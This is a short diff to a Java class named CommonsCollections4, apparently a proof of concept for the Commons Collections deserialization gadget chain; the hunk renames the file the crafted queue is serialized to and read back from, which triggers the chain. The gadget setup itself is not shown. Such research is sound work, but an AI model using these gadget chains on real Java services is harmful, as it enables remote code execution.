@@ -48,11 +48,11 @@ public class CommonsCollections4 {
         com.setAccessible(true);
         com.set(queue,comparator);
 
-        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc4p.out"));
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc4.out"));
         outputStream.writeObject(queue);
         outputStream.close();
 
-        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc4p.out"));
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc4.out"));
         inputStream.readObject();
     }
 }
